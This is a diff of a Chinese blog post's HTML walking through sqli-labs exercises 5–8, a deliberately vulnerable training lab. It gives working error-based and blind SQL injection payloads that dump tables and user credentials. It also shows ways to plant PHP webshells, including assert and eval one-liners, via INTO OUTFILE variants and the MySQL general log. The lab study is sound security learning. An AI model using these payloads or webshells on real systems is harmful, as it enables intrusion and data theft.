+<h4 id="写入webshell-1"><a href="#写入webshell-1" class="headerlink" title="写入webshell"></a>写入webshell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; into outfile &#x27;C:/less5.php&#x27; lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c657373355d293b3f3e --+</span><br></pre></td></tr></table></figure>
+
+<p>这里的这串16进制0x3c3f7068702061737365727428245f504f53545b6c657373355d293b3f3e通过16进制转字符串可翻译为</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php assert($_POST[less5]);?&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="写入webshell归纳"><a class="markdownIt-Anchor" href="#写入webshell归纳">#</a> 写入 webshell 归纳</h4>
-<h5 id="1-union-select写入"><a class="markdownIt-Anchor" href="#1-union-select写入">#</a> 1、union select 写入</h5>
-<p>这是最常见的写入方式，union 跟 select into outfile，将一句话写入 shell.php，仅适用于<strong>联合注入</strong><br>
-条件：secure_file_priv 支持 web 目录文件导出，数据库 File 权限，获取物理路径<br>
-命令：</p>
+
+<h4 id="写入webshell归纳"><a href="#写入webshell归纳" class="headerlink" title="写入webshell归纳"></a>写入webshell归纳</h4><h5 id="1、union-select写入"><a href="#1、union-select写入" class="headerlink" title="1、union select写入"></a>1、union select写入</h5><p>这是最常见的写入方式，union跟select into outfile，将一句话写入shell.php，仅适用于<strong>联合注入</strong><br>条件：secure_file_priv支持web目录文件导出，数据库File权限，获取物理路径<br>命令：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; union select 1,&quot;&lt;?php @eval($_GET[&#x27;cmd&#x27;])?&gt;&quot; into outfile &#x27;E:\\phpStudy\\PHPTutorial\\WWW\\DVWA-master\\cmd.php&#x27; --+</span><br></pre></td></tr></table></figure>
-<h5 id="lines-terminated-by写入"><a class="markdownIt-Anchor" href="#lines-terminated-by写入">#</a> Lines terminated by 写入</h5>
-<p>当 mysql 注入点为<strong>盲注或报错</strong>，Union select 写入是不能利用的，那么可以通过分隔符写入，SQLMAP 的–os-shell 命令，所采用的就是这种方式<br>
-条件：secure_file_priv 支持 web 目录文件导出，数据库 File 权限，获取物理路径<br>
-命令:</p>
+
+<h5 id="Lines-terminated-by写入"><a href="#Lines-terminated-by写入" class="headerlink" title="Lines terminated by写入"></a>Lines terminated by写入</h5><p>当mysql注入点为<strong>盲注或报错</strong>，Union select写入是不能利用的，那么可以通过分隔符写入，SQLMAP的–os-shell命令，所采用的就是这种方式<br>条件：secure_file_priv支持web目录文件导出，数据库File权限，获取物理路径<br>命令:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; into outfile &#x27;E:\\phpStudy\\PHPTutorial\\WWW\\DVWA-master\\321.php&#x27; lines terminated by &#x27;&lt;?php phpinfo(); ?&gt;&#x27;--+</span><br></pre></td></tr></table></figure>
-<p>注入原理：通过 select 语句查询的内容写入文件，也就是 1’ into outfile 'E:\phpStudy\PHPTutorial\WWW\DVWA-master\aaa.php’这样写的原因，然后利用 lines terminated by 语句进行拼接，拼接后面的 webshell 内容</p>
-<h5 id="3-lines-starting-by写入"><a class="markdownIt-Anchor" href="#3-lines-starting-by写入">#</a> 3、lines starting by 写入</h5>
-<p>命令：</p>
+
+<p>注入原理：通过select语句查询的内容写入文件，也就是1’ into outfile ‘E:\phpStudy\PHPTutorial\WWW\DVWA-master\aaa.php’这样写的原因，然后利用lines terminated by语句进行拼接，拼接后面的webshell内容</p>
+<h5 id="3、lines-starting-by写入"><a href="#3、lines-starting-by写入" class="headerlink" title="3、lines starting by写入"></a>3、lines starting by写入</h5><p>命令：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; into outfile &#x27;E:\\phpStudy\\PHPTutorial\\WWW\\DVWA-master\\123.php&#x27; lines starting by &#x27;&lt;?php phpinfo() ?&gt;&#x27;--+</span><br></pre></td></tr></table></figure>
-<p>注入原理：利用 lines starting by 语句进行拼接，拼接后面的 webshell 内容，lines starting by 可以理解成以每行开始的位置添加 xx 语句</p>
-<h5 id="4-fields-terminated-by写入"><a class="markdownIt-Anchor" href="#4-fields-terminated-by写入">#</a> 4、fields terminated by 写入</h5>
-<p>命令：</p>
+
+<p>注入原理：利用lines starting by语句进行拼接，拼接后面的webshell内容，lines starting by可以理解成以每行开始的位置添加xx语句</p>
+<h5 id="4、fields-terminated-by写入"><a href="#4、fields-terminated-by写入" class="headerlink" title="4、fields terminated by写入"></a>4、fields terminated by写入</h5><p>命令：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; into outfile &#x27;E:\\phpStudy\\PHPTutorial\\WWW\\DVWA-master\\kuku.php&#x27; fields terminated by &#x27;&lt;?php phpinfo() ?&gt;&#x27;--+</span><br></pre></td></tr></table></figure>
-<p>注入原理：利用 fields terminated by 语句进行拼接，拼接后面的 webshell 内容，fields terminated by 可以理解为以每个字段的位置添加 xx 内容</p>
-<h5 id="5-columns-terminated-by写入"><a class="markdownIt-Anchor" href="#5-columns-terminated-by写入">#</a> 5、COLUMNS terminated by 写入</h5>
-<p>命令：</p>
+
+<p>注入原理：利用fields terminated by语句进行拼接，拼接后面的webshell内容，fields terminated by可以理解为以每个字段的位置添加xx内容</p>
+<h5 id="5、COLUMNS-terminated-by写入"><a href="#5、COLUMNS-terminated-by写入" class="headerlink" title="5、COLUMNS terminated by写入"></a>5、COLUMNS terminated by写入</h5><p>命令：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; into outfile &#x27;E:\\phpStudy\\PHPTutorial\\WWW\\DVWA-master\\hao.php&#x27; COLUMNS terminated by &#x27;&lt;?php phpinfo() ?&gt;&#x27;--</span><br></pre></td></tr></table></figure>
-<p>注入原理：利用 COLUMNS terminated by 语句进行拼接，拼接后面的 webshell 内容，COLUMNS terminated by 可以理解为以每个字段的位置添加 xx 内容</p>
-<h5 id="6-利用log写入"><a class="markdownIt-Anchor" href="#6-利用log写入">#</a> 6、利用 log 写入</h5>
-<p>新版本的 MYSQL 设置了导出文件的路径，很难在获取 webshell 过程中去修改配置的文件，无法通过使用 select into outfile 来写入一句话，这时我们可以通过修改 MYSQL 的 log 文件来获取 Webshell<br>
- 条件：数据库用户需具备 Super 和 File 服务器的权限，获取物理路径</p>
+
+<p>注入原理：利用COLUMNS terminated by语句进行拼接，拼接后面的webshell内容，COLUMNS terminated by可以理解为以每个字段的位置添加xx内容</p>
+<h5 id="6、利用log写入"><a href="#6、利用log写入" class="headerlink" title="6、利用log写入"></a>6、利用log写入</h5><p>新版本的MYSQL设置了导出文件的路径，很难在获取webshell过程中去修改配置的文件，无法通过使用select into outfile来写入一句话，这时我们可以通过修改MYSQL的log文件来获取Webshell<br>条件：数据库用户需具备Super和File服务器的权限，获取物理路径</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;                        #查看配置</span><br><span class="line">set global general_log = on;                            #开启general log模式</span><br><span class="line"> set global general_log_file = &#x27;E:/phpStudy/PHPTutorial/WWW/DVWA-master/evil.php&#x27;;    #设置日志目录为shell地址</span><br><span class="line">select &#x27;&lt;?php phpinfo() ?&gt;&#x27;                     #写入shell</span><br><span class="line">set global general_log=off;                             #关闭general log模式</span><br></pre></td></tr></table></figure>
-<p>写入 webshell 学习于：<a target="_blank" rel="noopener" href="https://blog.csdn.net/bring_coco/article/details/114756692">https://blog.csdn.net/bring_coco/article/details/114756692</a></p>
-<h2 id="sqli-labs-6"><a class="markdownIt-Anchor" href="#sqli-labs-6">#</a> sqli-labs-6</h2>
-<h4 id="初步判断-5"><a class="markdownIt-Anchor" href="#初步判断-5">#</a> 初步判断</h4>
-<p>输入正确的 id</p>
+
+<p>写入webshell学习于：<a target="_blank" rel="noopener" href="https://blog.csdn.net/bring_coco/article/details/114756692">https://blog.csdn.net/bring_coco/article/details/114756692</a></p>
+<h2 id="sqli-labs-6"><a href="#sqli-labs-6" class="headerlink" title="sqli-labs-6"></a>sqli-labs-6</h2><h4 id="初步判断-4"><a href="#初步判断-4" class="headerlink" title="初步判断"></a>初步判断</h4><p>输入正确的id</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1</span><br></pre></td></tr></table></figure>
+
 <p>页面显示：</p>
 <blockquote>
-<p>You are in…</p>
+<p>You are in………..</p>
 </blockquote>
-<p>说明本关不回显<br>
-添加’,&quot;后发现&quot; 输入后页面显示报错</p>
+<p>说明本关不回显<br>添加’,”后发现”输入后页面显示报错</p>
 <blockquote>
-<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1&quot;” LIMIT 0,1’ at line 1</p>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1”” LIMIT 0,1’ at line 1</p>
 </blockquote>
 <p>说明需要闭合的是双引号</p>
-<h4 id="获取数据库名称-4"><a class="markdownIt-Anchor" href="#获取数据库名称-4">#</a> 获取数据库名称</h4>
-<p>使用报错注入得到数据库名称</p>
+<h4 id="获取数据库名称-3"><a href="#获取数据库名称-3" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h4><p>使用报错注入得到数据库名称</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示：</p>
 <blockquote>
-<p>XPATH syntax error: ‘<sub>security</sub>’</p>
+<p>XPATH syntax error: ‘<del>security</del>‘</p>
 </blockquote>
-<p>从而得知数据库名称为<strong> security</strong></p>
-<h4 id="获取所有表名-3"><a class="markdownIt-Anchor" href="#获取所有表名-3">#</a> 获取所有表名</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;),1,31),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+<p>从而得知数据库名称为<strong>security</strong></p>
+<h4 id="获取所有表名-2"><a href="#获取所有表名-2" class="headerlink" title="获取所有表名"></a>获取所有表名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;),1,31),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示：</p>
 <blockquote>
-<p>XPATH syntax error: ‘<sub>emails,referers,uagents,users</sub>’</p>
+<p>XPATH syntax error: ‘<del>emails,referers,uagents,users</del>‘</p>
 </blockquote>
-<p>得到所有的表名为<strong> emails,referers,uagents,users</strong></p>
-<h4 id="获取users表中的所有列名"><a class="markdownIt-Anchor" href="#获取users表中的所有列名">#</a> 获取 users 表中的所有列名</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27; and table_schema = &#x27;security&#x27;),1,31),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+<p>得到所有的表名为<strong>emails,referers,uagents,users</strong></p>
+<h4 id="获取users表中的所有列名"><a href="#获取users表中的所有列名" class="headerlink" title="获取users表中的所有列名"></a>获取users表中的所有列名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27; and table_schema = &#x27;security&#x27;),1,31),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示：</p>
 <blockquote>
-<p>XPATH syntax error: ‘<sub>id,username,password</sub>’</p>
+<p>XPATH syntax error: ‘<del>id,username,password</del>‘</p>
 </blockquote>
-<p>得到 users 表中的所有列名为<strong> id,username,password</strong></p>
-<h4 id="获取users表中的所有username和password"><a class="markdownIt-Anchor" href="#获取users表中的所有username和password">#</a> 获取 users 表中的所有 username 和 password</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot; and updatexml(1,concat(0x7e,(select (concat(username,&#x27;^&#x27;,password)) from users limit 0,1),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+<p>得到users表中的所有列名为<strong>id,username,password</strong></p>
+<h4 id="获取users表中的所有username和password"><a href="#获取users表中的所有username和password" class="headerlink" title="获取users表中的所有username和password"></a>获取users表中的所有username和password</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot; and updatexml(1,concat(0x7e,(select (concat(username,&#x27;^&#x27;,password)) from users limit 0,1),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示：</p>
 <blockquote>
-<p>XPATH syntax error: ‘<sub>Dumb^Dumb</sub>’</p>
+<p>XPATH syntax error: ‘<del>Dumb^Dumb</del>‘</p>
 </blockquote>
-<p>改变 limit 后面的数字 limit 1,1、limit 2,1 。。。<br>
-获取所有的 username 和 password</p>
-<h4 id="写入webshell-3"><a class="markdownIt-Anchor" href="#写入webshell-3">#</a> 写入 webshell</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot; into outfile &#x27;C:/less6.php&#x27; lines terminated by 0x3c3f7068702061737365727428245f504f53545b4c657373365d293b203f3e --+</span><br></pre></td></tr></table></figure>
-<p>可以在相关路径找到对应 php 文件，0x 开头的十六进制符号可以用 16 进制转字符翻译</p>
-<h2 id="sqli-labs-7"><a class="markdownIt-Anchor" href="#sqli-labs-7">#</a> sqli-labs-7</h2>
-<h4 id="初步判断-6"><a class="markdownIt-Anchor" href="#初步判断-6">#</a> 初步判断</h4>
-<p>输入正确的 id</p>
+<p>改变limit后面的数字limit 1,1、limit 2,1 。。。<br>获取所有的username和password</p>
+<h4 id="写入webshell-2"><a href="#写入webshell-2" class="headerlink" title="写入webshell"></a>写入webshell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot; into outfile &#x27;C:/less6.php&#x27; lines terminated by 0x3c3f7068702061737365727428245f504f53545b4c657373365d293b203f3e --+</span><br></pre></td></tr></table></figure>
+
+<p>可以在相关路径找到对应php文件，0x开头的十六进制符号可以用16进制转字符翻译</p>
+<h2 id="sqli-labs-7"><a href="#sqli-labs-7" class="headerlink" title="sqli-labs-7"></a>sqli-labs-7</h2><h4 id="初步判断-5"><a href="#初步判断-5" class="headerlink" title="初步判断"></a>初步判断</h4><p>输入正确的id</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1</span><br></pre></td></tr></table></figure>
+
 <p>页面显示：</p>
 <blockquote>
-<p>You are in… Use outfile…</p>
+<p>You are in…. Use outfile……</p>
 </blockquote>
-<p>加入’<br>
-页面显示：</p>
+<p>加入’<br>页面显示：</p>
 <blockquote>
-<p>You have an error in your SQL syntaxYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘‘1’’)) LIMIT 0,1’ at line 1</p>
+<p>You have an error in your SQL syntaxYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’)) LIMIT 0,1’ at line 1</p>
 </blockquote>
-<p>说明是 ((’’)) 闭合</p>
-<h4 id="获取数据库名称-5"><a class="markdownIt-Anchor" href="#获取数据库名称-5">#</a> 获取数据库名称</h4>
-<p>运用报错注入</p>
+<p>说明是((‘’))闭合</p>
+<h4 id="获取数据库名称-4"><a href="#获取数据库名称-4" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h4><p>运用报错注入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;)) and updatexml(1,concat(0x7e,(select database()),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示：</p>
 <blockquote>
-<p>You have an error in your SQL syntaxXPATH syntax error: ‘<sub>security</sub>’</p>
+<p>You have an error in your SQL syntaxXPATH syntax error: ‘<del>security</del>‘</p>
 </blockquote>
-<p>得到数据库名称为 security</p>
-<h4 id="获取所有表名-4"><a class="markdownIt-Anchor" href="#获取所有表名-4">#</a> 获取所有表名</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;)) and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;),1,31),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+<p>得到数据库名称为security</p>
+<h4 id="获取所有表名-3"><a href="#获取所有表名-3" class="headerlink" title="获取所有表名"></a>获取所有表名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;)) and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;),1,31),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示：</p>
 <blockquote>
-<p>You have an error in your SQL syntaxXPATH syntax error: ‘<sub>emails,referers,uagents,users</sub>’</p>
+<p>You have an error in your SQL syntaxXPATH syntax error: ‘<del>emails,referers,uagents,users</del>‘ </p>
 </blockquote>
-<p>得到所有的表名为<strong> emails,referers,uagents,users</strong></p>
-<h4 id="获取users表中的所有列名-2"><a class="markdownIt-Anchor" href="#获取users表中的所有列名-2">#</a> 获取 users 表中的所有列名</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;)) and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27; and table_schema = &#x27;security&#x27;),1,31),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+<p>得到所有的表名为<strong>emails,referers,uagents,users</strong></p>
+<h4 id="获取users表中的所有列名-1"><a href="#获取users表中的所有列名-1" class="headerlink" title="获取users表中的所有列名"></a>获取users表中的所有列名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;)) and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27; and table_schema = &#x27;security&#x27;),1,31),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示：</p>
 <blockquote>
-<p>You have an error in your SQL syntaxXPATH syntax error: ‘<sub>id,username,password</sub>’</p>
+<p>You have an error in your SQL syntaxXPATH syntax error: ‘<del>id,username,password</del>‘</p>
 </blockquote>
-<p>可以知道 users 表中所有的列名为<strong> id,username,password</strong></p>
-<h4 id="获取users表中的所有username和password-2"><a class="markdownIt-Anchor" href="#获取users表中的所有username和password-2">#</a> 获取 users 表中的所有 username 和 password</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;)) and updatexml(1,concat(0x7e,(select concat(username,&#x27;^&#x27;,password) from users limit 0,1),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+<p>可以知道users表中所有的列名为<strong>id,username,password</strong></p>
+<h4 id="获取users表中的所有username和password-1"><a href="#获取users表中的所有username和password-1" class="headerlink" title="获取users表中的所有username和password"></a>获取users表中的所有username和password</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;)) and updatexml(1,concat(0x7e,(select concat(username,&#x27;^&#x27;,password) from users limit 0,1),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示：</p>
 <blockquote>
-<p>You have an error in your SQL syntaxXPATH syntax error: ‘<sub>Dumb^Dumb</sub>’</p>
+<p>  You have an error in your SQL syntaxXPATH syntax error: ‘<del>Dumb^Dumb</del>‘ </p>
 </blockquote>
-<p>得到第一组 username 和 password 为 Dumb^Dumb<br>
- 接着更改 limit 后面的数字获取所有的 username 和 password</p>
-<h4 id="写入webshell-4"><a class="markdownIt-Anchor" href="#写入webshell-4">#</a> 写入 webshell</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;)) into outfile &#x27;C:/Less7.php&#x27; lines terminated by 0x3c3f7068702061737365727428245f504f53545b4c657373375d293b203f3e --+</span><br></pre></td></tr></table></figure>
-<h2 id="sqli-labs-8"><a class="markdownIt-Anchor" href="#sqli-labs-8">#</a> sqli-labs-8</h2>
-<h4 id="初步判断-7"><a class="markdownIt-Anchor" href="#初步判断-7">#</a> 初步判断</h4>
-<p>输入正确的 id</p>
+<p>得到第一组username和password为Dumb^Dumb<br>接着更改limit后面的数字获取所有的username和password</p>
+<h4 id="写入webshell-3"><a href="#写入webshell-3" class="headerlink" title="写入webshell"></a>写入webshell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;)) into outfile &#x27;C:/Less7.php&#x27; lines terminated by 0x3c3f7068702061737365727428245f504f53545b4c657373375d293b203f3e --+</span><br></pre></td></tr></table></figure>
+
+<h2 id="sqli-labs-8"><a href="#sqli-labs-8" class="headerlink" title="sqli-labs-8"></a>sqli-labs-8</h2><h4 id="初步判断-6"><a href="#初步判断-6" class="headerlink" title="初步判断"></a>初步判断</h4><p>输入正确的id</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1</span><br></pre></td></tr></table></figure>
+
 <p>页面显示：</p>
 <blockquote>
-<p>You are in…</p>
+<p>You are in………..</p>
 </blockquote>
-<p>说明本题不回显<br>
-加上’<br>
-页面显示异常，本题报错不回显<br>
-输入–+<br>
- 页面显示正常<br>
-说明有包装</p>
+<p>说明本题不回显<br>加上’<br>页面显示异常，本题报错不回显<br>输入–+<br>页面显示正常<br>说明有包装</p>
 <p>本题需要我们使用盲注来获取信息</p>
-<h4 id="获取数据库名称-6"><a class="markdownIt-Anchor" href="#获取数据库名称-6">#</a> 获取数据库名称</h4>
-<p>先判断数据库名称的长度</p>
+<h4 id="获取数据库名称-5"><a href="#获取数据库名称-5" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h4><p>先判断数据库名称的长度</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and (length(database()))=1 --+</span><br></pre></td></tr></table></figure>
-<p>从 1 一直到 8 时<br>
-此时页面显示 you are in…<br>
- 说明数据库名称长度为 8</p>
-<p>用 left 获取数据库名称从左到右的字符这里（也可以使用 ascii 等）</p>
+
+<p>从1一直到8时<br>此时页面显示you are in……<br>说明数据库名称长度为8</p>
+<p>用left获取数据库名称从左到右的字符这里（也可以使用ascii等）</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and left((select database()),1)=&#x27;s&#x27; --+</span><br></pre></td></tr></table></figure>
-<p>依次增加数字和尝试后面的字符，可以配合 &gt;,&lt;,=, 二分法一起使用<br>
-如 url?id=1’ and left ((select database ()),1)&gt;‘a’ --+<br>
- 最终可以得到</p>
+
+<p>依次增加数字和尝试后面的字符，可以配合&gt;,&lt;,&#x3D;,二分法一起使用<br>如url?id&#x3D;1’ and left((select database()),1)&gt;’a’ –+<br>最终可以得到</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and left((select database()),8)=&#x27;security&#x27;</span><br></pre></td></tr></table></figure>
-<p>即数据库名称等于 security</p>
-<h4 id="获取所有信息"><a class="markdownIt-Anchor" href="#获取所有信息">#</a> 获取所有信息</h4>
-<p>除此之外我们还可以获得所有数据库的名称，使用同样的方法去一个一个才出来，也可以使用 sqlmap 直接跑，获取所有的内容<br>
-如果手工注入可能花费的时间比较久<br>
- payload 如下：</p>
+
+<p>即数据库名称等于security</p>
+<h4 id="获取所有信息"><a href="#获取所有信息" class="headerlink" title="获取所有信息"></a>获取所有信息</h4><p>除此之外我们还可以获得所有数据库的名称，使用同样的方法去一个一个才出来，也可以使用sqlmap直接跑，获取所有的内容<br>如果手工注入可能花费的时间比较久<br>payload如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//获取所有数据库名称</span><br><span class="line">url?id=1&#x27; and left((select schema_name from information_schema.schemata limit 0,1),5)=&#x27;mysql&#x27; --+ //查出来本地的第一个数据库为mysql</span><br><span class="line">//获取security数据库下的所有表名</span><br><span class="line">?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1)&gt;&#x27;a&#x27; --+</span><br><span class="line">//获取security数据库users表下的所有列名</span><br><span class="line">?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1),1)&gt;&#x27;a&#x27; --+</span><br><span class="line">//获取所有username和password</span><br><span class="line">?id=1&#x27; and left((select username from users limit 0,1),1)&gt;&#x27;a&#x27; --+</span><br></pre></td></tr></table></figure>
+
 
   </div>
   
@@ -3367,7 +3208,7 @@ limit 2,1<br>
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/&title=sqli-labs-1-8 - Dr4x3zz&summary=# sqli-labs-1-8"
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/&title=sqli-labs-1-8 - Dr4x3zz&summary=sqli-labs-1-8"
           
           >
           
@@ -3379,7 +3220,7 @@ limit 2,1<br>
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/&title=sqli-labs-1-8 - Dr4x3zz&summary=# sqli-labs-1-8"
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/&title=sqli-labs-1-8 - Dr4x3zz&summary=sqli-labs-1-8"
           
           >
           
@@ -3391,7 +3232,7 @@ limit 2,1<br>
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/&title=sqli-labs-1-8 - Dr4x3zz&summary=# sqli-labs-1-8"
+          target="_blank" href="http://service.weibo.com/share/share.php?url=https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/&title=sqli-labs-1-8 - Dr4x3zz&summary=sqli-labs-1-8"
           
           >
           
@@ -3426,24 +3267,20 @@ limit 2,1<br>
       
         <a class='prev' href='/2022/12/22/php%E5%AD%A6%E4%B9%A02022-12-22/'>
           <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>php学习2022-12-22</p>
-          <p class='content'># php 学习 (三元运算、if_else、switch)
-
-# 三元运算
-
-三元运算符的格式：(expr1) ? (expr2) : (expr3)
- 解释：如果条件”expr1” 成立，则...</p>
+          <p class='content'>php学习(三元运算、if_else、switch)
+三元运算
+三元运算符的格式：(expr1) ? (expr2) : (expr3)解释：如果条件”expr1”成立，则执行语句”expr2”...</p>
         </a>
       
       
         <a class='next' href='/2022/12/21/php%E5%AD%A6%E4%B9%A02022-12-21/'>
           <p class='title'>php学习2022-12-21<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'># php 学习 (常量、运算符、字符串函数)
-# 
-# 常量
+          <p class='content'>php学习(常量、运算符、字符串函数)
 
-设置常量通常用 define () 函数
- define (“常量的名称”,“常量的值”,(可定义为 true 也可不写));
-...</p>
+常量
+设置常量通常用define()函数define(“常量的名称”,”常量的值”,(可定义为true也可不写));例：
+
+12345678910111...</p>
         </a>
       
     </div>
